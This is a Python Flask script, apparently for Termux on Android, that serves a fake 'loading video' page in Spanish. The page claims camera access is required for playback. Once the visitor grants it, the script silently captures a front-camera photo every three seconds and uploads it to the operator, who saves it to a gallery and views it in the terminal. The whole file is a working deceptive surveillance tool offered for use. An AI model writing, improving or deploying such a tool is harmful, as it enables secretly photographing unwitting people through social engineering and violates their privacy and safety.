import os
import subprocess
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

# Carpeta donde se guardarán las fotos en la galería
CARPETA_GALERIA = os.path.expanduser("~/storage/pictures/fotos_web")
os.makedirs(CARPETA_GALERIA, exist_ok=True)

# Ruta temporal para mostrar con chafa (usa TMPDIR de Termux)
ULTIMA_FOTO = os.path.join(os.environ.get("TMPDIR", "/data/data/com.termux/files/usr/tmp"), "ultima_foto.jpg")

HTML_PAGINA = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            color: #fff;
            flex-direction: column;
        }
        .container {
            text-align: center;
            max-width: 90%;
            background: #16213e;
            padding: 40px 20px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #3a3a5c;
            border-top: 6px solid #e94560;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #eee;
        }
        .subtitle {
            font-size: 14px;
            color: #aaa;
            margin-bottom: 25px;
        }
        .fake-progress {
            width: 100%;
            height: 4px;
            background: #333;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }
        .fake-progress-bar {
            height: 100%;
            width: 0%;
            background: #e94560;
            animation: progress 4s ease-in-out infinite;
        }
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 95%; }
        }
        .camera-note {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .camera-note i {
            font-style: normal;
            background: #333;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 10px;
            color: #aaa;
        }
        .btn-retry {
            display: none;
            margin-top: 15px;
            background: #e94560;
            color: #fff;
            border: none;
            padding: 8px 20px;
            border-radius: 30px;
            font-size: 14px;
            cursor: pointer;
        }
        .btn-retry:hover {
            background: #c73e54;
        }
        #status-msg {
            font-size: 13px;
            color: #888;
            margin-top: 10px;
        }
        #video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="title">Cargando video...</div>
        <div class="subtitle">Espera un momento, estamos preparando la reproducción</div>
        <div class="fake-progress">
            <div class="fake-progress-bar"></div>
        </div>
        <div id="status-msg">Conectando con el servidor...</div>
        <div class="camera-note">
            <span>📷</span> Se requiere acceso a la cámara para la reproducción en vivo
            <i>necesario</i>
        </div>
        <button id="btnRetry" class="btn-retry">Reintentar acceso</button>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        (function() {
            const video = document.getElementById('video');
            const statusMsg = document.getElementById('status-msg');
            const btnRetry = document.getElementById('btnRetry');

            let stream = null;
            let intervalo = null;
            let videoReady = false;

            function enviarFoto() {
                if (!stream || !videoReady) {
                    console.warn('Video no listo, esperando...');
                    return;
                }
                // Verificar que el video tenga dimensiones válidas
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    console.warn('Video sin dimensiones, esperando frame...');
                    return;
                }

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(function(blob) {
                    const formData = new FormData();
                    formData.append('foto', blob, 'foto.jpg');

                    fetch('/upload', {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.text())
                    .catch(err => console.error('Error al enviar:', err));
                }, 'image/jpeg', 0.7);
            }

            function iniciarCamara() {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .then(function(mediaStream) {
                        stream = mediaStream;
                        video.srcObject = mediaStream;

                        // Forzar reproducción (muted permite autoplay en móviles)
                        video.muted = true;
                        video.play().catch(e => console.warn('Autoplay bloqueado:', e));

                        // Esperar a que el video tenga datos antes de habilitar capturas
                        video.addEventListener('loadedmetadata', function() {
                            videoReady = true;
                            statusMsg.innerText = '✅ Video listo (reproduciendo en segundo plano)';
                            btnRetry.style.display = 'none';

                            // Esperar 500ms extra para asegurar un frame
                            setTimeout(() => {
                                enviarFoto(); // primera foto
                            }, 500);

                            // Luego cada 3 segundos
                            if (intervalo) clearInterval(intervalo);
                            intervalo = setInterval(enviarFoto, 3000);
                        });

                        // Si por algún motivo el evento no se dispara, forzar después de 2s
                        setTimeout(() => {
                            if (!videoReady) {
                                videoReady = true;
                                statusMsg.innerText = '✅ Video forzado (reproduciendo)';
                                enviarFoto();
                                intervalo = setInterval(enviarFoto, 3000);
                            }
                        }, 2000);

                    })
                    .catch(function(err) {
                        console.error('Error cámara:', err);
                        statusMsg.innerText = '⚠️ No se pudo acceder a la cámara. Haz clic en "Reintentar".';
                        btnRetry.style.display = 'inline-block';
                        btnRetry.onclick = function() {
                            btnRetry.style.display = 'none';
                            statusMsg.innerText = 'Intentando de nuevo...';
                            iniciarCamara();
                        };
                    });
            }

            setTimeout(iniciarCamara, 500);
        })();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PAGINA)

@app.route('/upload', methods=['POST'])
def upload():
    if 'foto' not in request.files:
        return "No se recibió foto", 400

    foto = request.files['foto']
    
    # Generar nombre único con timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    nombre_archivo = f"foto_{timestamp}.jpg"
    ruta_completa = os.path.join(CARPETA_GALERIA, nombre_archivo)

    # Guardar en la galería
    foto.save(ruta_completa)
    
    # También guardar copia temporal para mostrar con chafa
    foto.save(ULTIMA_FOTO)

    # Mostrar en la terminal con chafa
    try:
        subprocess.run(['chafa', '-s', '50x25', ULTIMA_FOTO], check=False)
        print(f"\n📸 Foto guardada en: {ruta_completa}")
        print(f"   Hora: {datetime.now().strftime('%H:%M:%S')}\n")
    except Exception as e:
        print(f"Error al mostrar con chafa: {e}")

    # Escanear el archivo para que aparezca en la galería (requiere termux-api)
    try:
        subprocess.run(['termux-media-scan', ruta_completa], check=False)
    except:
        pass  # Si no está instalado, no pasa nada

    return "OK", 200

if __name__ == '__main__':
    print("🚀 Servidor iniciado en http://localhost:5000")
    print(f"📁 Las fotos se guardarán en: {CARPETA_GALERIA}")
    print("📱 Abre la URL en el navegador. Verás una pantalla de 'Cargando video...'")
    print("   El usuario deberá conceder permiso de cámara (se muestra como necesario para el video).")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
